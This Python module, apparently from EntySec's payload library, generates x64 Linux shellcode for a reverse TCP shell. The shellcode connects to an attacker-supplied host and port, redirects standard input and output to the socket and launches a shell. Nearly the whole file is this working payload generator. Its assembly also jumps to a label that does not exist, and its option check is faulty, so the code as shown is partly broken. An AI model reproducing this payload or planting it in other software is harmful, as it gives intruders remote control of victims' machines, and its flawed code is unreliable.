#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.consts import Consts


class ShellReverseTCP(HatAsm, HatVenom, Consts):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            push 0x{rhost.hex()}
            push word 0x{rport.hex()}
            push word 2
            push 42
            push byte 16
            push byte 41
            push byte 1
            push byte 2

            pop rdi
            pop rsi
            xor rdx, rdx
            pop rax
            syscall

            mov rdi, rax
            pop rdx
            pop rax
            mov rsi, rsp
            syscall

            xor rsi, rsi

        dup:
            mov al, 33
            syscall

            inc rsi
            cmp rsi, 2
            jle loop

            xor rax, rax
            mov rdi, 0x{self.shell.hex()}
            xor rsi, rsi
            push rsi
            push rdi
            mov rdi, rsp
            xor rdx, rdx
            mov al, 59
            syscall
        """

        if assemble:
            return self.assemble('x64', shellcode)
        return shellcode
